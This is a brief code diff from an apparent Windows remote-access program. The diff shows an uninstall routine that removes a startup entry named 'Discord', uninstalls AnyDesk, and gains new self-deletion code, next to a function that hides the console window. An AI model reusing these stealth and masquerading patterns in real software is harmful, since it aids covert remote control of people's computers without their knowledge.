@@ -68,6 +68,11 @@ void hideConsoleWindow()
 }
 
 void uninstallProgram() {
-    RemoveMyProgramFromStartup();
+    RemoveMyProgramFromStartup(L"Discord");
     uninstallAnyDesk();
+
+    wchar_t szPathToExe[MAX_PATH];
+    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+    
+    DeleteFileW(szPathToExe);
 }
